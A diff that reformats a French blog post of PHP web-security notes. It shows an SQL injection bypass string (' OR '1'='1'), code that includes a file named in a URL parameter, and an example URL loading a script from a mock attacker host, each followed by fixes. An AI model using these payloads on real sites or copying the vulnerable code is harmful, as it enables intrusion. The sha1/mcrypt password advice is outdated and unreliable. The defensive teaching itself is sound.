@@ -1,7 +1,7 @@
 ---
 published: true
 layout: post
-date: 2017-02-9
+date: 2017-02-17T00:00:00.000Z
 tags:
   - backend
   - web
@@ -381,9 +381,10 @@ if ('monPass' === $password){
 }
 ```
 
-INJECTION SQL
+**INJECTION SQL**
 
-soit un formulaire de connexion :
+Soit un formulaire de connexion :
+
 ```php
 <?php
 mysql_connect('localhost','root',null);
@@ -411,29 +412,31 @@ if ($result = mysql_fetch_assoc($sql)){
     <<input type="submit">
 </form>
 ```
-CETTE REQUETE SQL COMPORTE UNE FAILLE DE SECURITE IMPORTANTE
-car sans utilisateur et sans mot de passe il est possible de se connecter recuperer les données d'un utilisateur
 
- en ajoutant simplement ( ' OR '1'='1' )
- 
- SELECT * FROM admin WHERE user = '' OR '1'='1' and password = '' OR '1'='1'
+**CETTE REQUETE SQL COMPORTE UNE FAILLE DE SECURITE IMPORTANTE**
 
- VOILA, ici on recupere tout de la table admin tels que user est egale 
- vide OU 1 est égale a 1 donc true ET tels que password est egale a vide OU
- 1 est egale a 1 donc true
+Car sans utilisateur et sans mot de passe il est possible de se connecter recuperer les données d'un utilisateur en ajoutant simplement `( ' OR '1'='1')`.
 
- TRUE et TRUE = TRUE
+```php
+SELECT * FROM admin WHERE user = '' OR '1'='1' and password = '' OR '1'='1
+```
+
+Voila, ici on recupere tout de la table admin tels que user est égale vide OU 1 est égale a 1 donc true ET tels que password est egale a vide OU 1 est egale a 1 donc true.
+
+`TRUE et TRUE = TRUE`
 
  Donc on récupere la base de donnée.
 
  Comment se proteger?
-- 1ere solution (pas la meilleur): Il faut échaper les variables POST
- avec "mysql_real_escape_string()"
- ex:
+ 
+* 1ere solution (pas la meilleur): Il faut échaper les variables POST avec `"mysql_real_escape_string()"` exemple :
+```php
 $username=isset($_POST['username']) ? mysql_real_escape_string($_POST['username']) : null;
 $password=isset($_POST['password']) ? mysql_real_escape_string($_POST['password']) : null;
+```
 
-- 2eme solution utiliser l'objet PDO:
+* 2eme solution utiliser l'objet PDO :
+```php
 <?php
 //mysql_connect('localhost','root',null);
 //mysql_select_db('info');
@@ -471,22 +474,17 @@ if ($result = $stmt->fetchObject()){
     <input type="password" name="password">
     <<input type="submit">
 </form>
+```
 
-- solution 3 (solution ULTIME): utiliser un ORM (Object Relational Mapper)
-utiliser par exemple l'ORM Doctirne, il permet d'ecrire des requetes dans un langage particulier
-puis de les faire joué dans un ensemble d'outils qui va s'occuper de travailer la requete jusqu'a
-son lancement final soit la récuperation des objet et la remonté d'informations
+* Solution 3 (solution ULTIME): utiliser un ORM (Object Relational Mapper). Utiliser par exemple l'ORM Doctirne, il permet d'ecrire des requetes dans un langage particulier puis de les faire joué dans un ensemble d'outils qui va s'occuper de travailer la requete jusqu'à son lancement final soit la récuperation des objet et la remonté d'informations. Il utilise le langage DQL
 
-il utilise le langage DQL
+**LES MOTS DE PASSES**
 
- 
-
-
- LES MOTS DE PASSES
- voir le generateur de mot de passe : strongpasswordgenerator.com
+Voir le generateur de mot de passe : strongpasswordgenerator.com
    
-- pour les password il faut utiliser un sha1 et le saler
+* pour les password il faut utiliser un sha1 et le saler
 
+```
 <?php
 $pdo=new PDO('mysql:host=localhost;dbname=info','root',null);
 
@@ -520,25 +518,28 @@ if ($result = $stmt->fetchObject()){
     <input type="password" name="password">
     <<input type="submit">
 </form>
+```
 
+* on peut utiliser "mcrypt" qui permet de créer un hash du password creer un salt de protection :
 
-- on peut utiliser "mcrypt" qui permet de créer un hash du password
- creer un salt de protection:
- $salt = strtr(base64_encode(mcrypt_create_iv(16, MCRYPT_DEV_URANDOM)), '+','.');
- $cost=10; cout de cryptage, plus il sera elevé plus il sera gourmant temps processeur
- $salt = sprintf("2a$%02d$",$cost) . $salt; //ajout du cout de fonctionnement
+```php
+$salt = strtr(base64_encode(mcrypt_create_iv(16, MCRYPT_DEV_URANDOM)), '+','.');
+$cost=10; cout de cryptage, plus il sera elevé plus il sera gourmant temps processeur
+$salt = sprintf("2a$%02d$",$cost) . $salt; //ajout du cout de fonctionnement
  
- var_dump($salt); // pour voir le salt qu'on a crée
+var_dump($salt); // pour voir le salt qu'on a crée
 
 Maintenant on crée un Hash du pasword en utilisant crypt()
 $password = sha1('monpass'.'saler');
 $hash = crypt($password, $salt);
 var_dump($hash); // pour afficher le hash
+```
 
 Donc il faudra faire ceci durant l'inscription pour l'inserer dans la BDD
 ensuite durant la connexion, il suffira de récuperer le password entrée par l'user
-puis refaire la hash pour voir si c'est la meme chose:
-ex:
+puis refaire la hash pour voir si c'est la même chose, exemple :
+
+```php
 if ($user = $stmt->fetchObject()){
     //ici, on compare le password hashé avec le hash
     if(crypt($password, $user->hash) === $user->hash){
@@ -547,74 +548,79 @@ if ($user = $stmt->fetchObject()){
 }else{
     echo 'mauvais mot de passe';
 }
+```
 
 Dans la bdd on a la colonne password avec le sha1 et une colone hash
 Faire une classe qui crée la password, le salt, etc...
 
+* dans la Version 5.5, php permet d'utiliser la fonction password_hash() et la fonction password_verify() qui vont nous permettre de faire la meme chose vu precedement mais en beaucoup plus simple.
 
-- dans la Version 5.5, php permet d'utiliser la fonction password_hash() et la fonction password_verify()
-qui vont nous permettre de faire la meme chose vu precedement mais en beaucoup plus simple.$_COOKIE
 password_hash prend en parametre un password un algo et un tableau d'options.
 
-string password_hash(string $password, integer $algo [,array $option])
+`string password_hash(string $password, integer $algo [,array $option])`
 
-echo password_hash("mon-password", PASSWORD_DEFAULT);
+`echo password_hash("mon-password", PASSWORD_DEFAULT);`
 resultat: $2y$10$.vGA109wmRjrwAVXD98HNOgsNpDcz1qm3Jq7KnEd1rVAGv3Fykk1a
 
-ou encore
-
+où encore :
+```php
 $options = [
     'cost' => 12,
 ];
 
 echo password_hash("monPass", PASSWORD_BCRYPT, $options);
+```
 
-ou encore mieux
-
+où encore mieux :
+```php
 $options = [
     'cost' => 12,
     'salt' => mcrypt_create_iv(22, MCRYPT_DEV_URANDOM),
 ];
 
 echo password_hash("monPass", PASSWORD_BCRYPT, $options);
+```
 
-Une foi le password crée il faut le verifier avec password_verify()
-
+Une fois le password crée il faut le verifier avec `password_verify()`
+```php
 boolean password_verify(string $password, string $hash)
 if (password_verify('monPass', $hash)){
     echo 'OK';
 }else{
     echo 'mauvais mot de passe'
 }
+```
 
-maintenant il suffit de créer une classe anglobant ces fonctions..
+Maintenant il suffit de créer une classe anglobant ces fonctions...
 
 
-UTILISER LES TYPAGES DE VARIABLES
+**UTILISER LES TYPAGES DE VARIABLES**
 
-on peut forcer le typage:
+on peut forcer le typage :
+```php
 $number =1;
 $text ='1';
 
 var_dump($number == (int)$text); => true
 
-verifier le type d'une variable:
+//verifier le type d'une variable:
 var_dump(gettype((int) $text)); => integer
+```
 
-si on caste en (bool) une chaine de caractere alors elle sera toujours egale a TRUE
+Si on caste en (bool) une chaine de caractere alors elle sera toujours egale à TRUE.
 
 
-REECRIRE DES PARAMETRES DE DONNES
+**REECRIRE DES PARAMETRES DE DONNES**
 
-info.php?id=4&comment=50
+`info.php?id=4&comment=50`
+
 on peut voir les paramettres de l'appli... 
 
-Apache permet la réecriture d'url pour obfusquer les parametres
-
-dans la racine, creer un .htaccess, dans lequel on va inclure des regles
+Apache permet la réecriture d'url pour obfusquer les parametres dans la racine, creer un .htaccess, dans lequel on va inclure des regles
 de réecriture.
 
 la 1ere regle c'est de définir que l'on veut démarer la réécriture d'url:
+```bash
 RewriteEngine on
 
 RewriteBase /~dossier/web/ 
@@ -629,45 +635,48 @@ RewriteRule înfo-([0-9]+)-([0-9]+)\.html$ info.php?id=$1&comment=$2
 info.php-4-50.html
 a la place de
 info.php?id=4&comment=50
+```
 
-grace à la réécriture, on n'expose plus de model de donnée directement dans les url
+Grace à la réécriture, on n'expose plus de model de donnée directement dans les url
 on peut faire de l'ecriture sementique et on peut utiliser cela dans le REFERENCEMENT.
 
+**INCLUDE ET REQUIRE**
+
+* `include` ne break pas la suite du script quand il retourne une erreur.
+* `require` break la suite du script quand il retourne une erreur.
+* `header('Location: info.php');` header permet de spécifier l'en-tête HTTP string lors de l'envoi des fichiers HTML.
 
 
-INCLUDE ET REQUIRE
+* l'injection de script, soit 2 fichiers php, info.php et plop.php
 
-include ne break pas la suite du script quand il retourne une erreur
-require break la suite du script quand il retourne une erreur
-header('Location: info.php'); header permet de spécifier l'en-tête HTTP string lors de l'envoi des fichiers HTML.
-
-- l'injection de script
-soit 2 fichiers php, info.php et plop.php
 dans info.php:
+```php
 <?php
 $script = $_GET['script'];
 include $script;
 echo 'toto';
-
+```
+```php
 dans plop.php:
 <?php
 echo 'toto2<br />';
+```
 
+Le fait d'inclure dans `include` ou `require` une variable récupéré dans l'url constitue une faille
 
-le fait d'inclure dans include ou require une variable récupéré dans l'url constitue une faille
-
-info.php?script=plop.php
+`info.php?script=plop.php`
 
 car on peut lui faire inclure autre choses comme une url pointant un mauvais script
 
-info.php?script=http://www.mechantpirate-a.fr/script.php
+`info.php?script=http://www.mechantpirate-a.fr/script.php`
 
 
-comment bloquer cela ?
+**comment bloquer cela ?**
 
 c'est de créér une fonction interne qui fait du mapping, on lui donne un nom puis
-la fonction verifie si le ficher existe:
+la fonction verifie si le ficher existe :
 
+```php
 function includeScript($key){
     $scriptBase = array(
         'menu' => 'plop.php'
@@ -679,68 +688,68 @@ function includeScript($key){
 $script = $_GET['script'];
 
 include includeScript($script);
+```
 
-Puis quand on tape cette url:
-info.php?script=menu
+Puis quand on tape cette url :
 
-alors plop.php sera inclus
+`info.php?script=menu`
 
-
-
+alors *plop.php* sera inclus.
 
 
-POUR TESTER SON SITE:
-- skipfish  (web application security scanner)
-c'est un scanner qui va effectuer des test sur le site
-puis un rapport est generé (dit les possibilité de failles)
+**POUR TESTER SON SITE :**
 
-il faut copier dictionnaires et signatures dans la racine du projet
+* skipfish (web application security scanner). C'est un scanner qui va effectuer des test sur le site puis un rapport est generé (dit les possibilité de failles).
+
+Il faut copier dictionnaires et signatures dans la racine du projet
 puis dans le terminal :
-skipfish -o scan http://baliz.org
 
-puis ouvrir l'index.html qui est le resultat du scan 
-orange important
-bleu moins important
-gris des infos
-vert des notes
+`skipfish -o scan http://baliz.org`
 
+Puis ouvrir l'index.html qui est le resultat du scan :
+	* orange important
+	* bleu moins important
+	* gris des infos
+	* vert des notes
  
-- phpqatools.org
-les outis pour la securité: PHP_CodeSniffer et PHP Mess Detector
-pour garantire qu'un code est bien ecrit et q'un site est bien réalisé on parlera de qualité de code
+* phpqatools.org, les outis pour la securité: **PHP_CodeSniffer** et **PHP Mess Detector**
+pour garantire qu'un code est bien ecrit et q'un site est bien réalisé on parlera de qualité de code.
  
--- php mess detector (faire du code plus propre):
-  pour le lancer, dans un terminal:
-  phpmd 
+	* php mess detector (faire du code plus propre):
+ 	```php
+    pour le lancer, dans un terminal:
+  	phpmd 
+	
+  	phpmd config html cleancode > phpmd.html
+	```
 
-  phpmd config html cleancode > phpmd.html
+	* php_code_sniffer (verifie le code)
+    ```php
+	pour le lancer:
+	phpcs config
+    ```
 
+	* phpDocumentor
+    ```php
+    quand on a un code commenté exemple dans info.php on a en en-tete:
 
--- php_code_sniffer (verifie le code)
-pour le lancer:
-phpcs config
+	/**
+ 	* Reverse a key to script name
+ 	*
+ 	* @param String $key key to convert to script name
+ 	*
+ 	* @return String Real script name to include
+ 	*/
 
+	pour le lancer:
+	phpdoc -f info.php
+	va generer une doc en lisant le script dans le dossir output/index.html
 
-- phpDocumentor
-quand on a un code commenté exemple dans info.php on a en en-tete:
+	on peut faire de la doc sur une classe, une fonction etc automatiquement avec phpDoc
+	```
 
-/**
- * Reverse a key to script name
- *
- * @param String $key key to convert to script name
- *
- * @return String Real script name to include
- */
-
-pour le lancer:
-phpdoc -f info.php
-va generer une doc en lisant le script dans le dossir output/index.html
-
-on peut faire de la doc sur une classe, une fonction etc automatiquement avec phpDoc
-
-
-
-
-
+autres choses:
+```php
 (verifier l'ancieneté de la session $_SESSION['last_access']=time(); )
 (tester avec if(time()-$_SESSION['last_access']>$session_timeout) )
+```
